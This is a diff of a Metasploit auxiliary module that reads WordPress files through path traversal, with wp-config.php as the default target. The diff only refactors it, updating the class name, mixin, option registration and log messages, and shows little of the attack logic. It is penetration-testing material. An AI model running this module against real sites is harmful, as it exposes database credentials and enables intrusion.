@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
-  include Msf::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
@@ -37,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('FILEPATH', [true, 'The wordpress file to read', 'wp-config.php']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the wordpress root folder)', 3 ])
-      ], self.class)
+      ])
   end
 
   def check
@@ -69,9 +66,9 @@ class Metasploit3 < Msf::Auxiliary
         fname
       )
 
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      vprint_error("#{peer} - Nothing was downloaded. Check the path and the traversal parameters.")
+      vprint_error("Nothing was downloaded. Check the path and the traversal parameters.")
     end
   end
 end
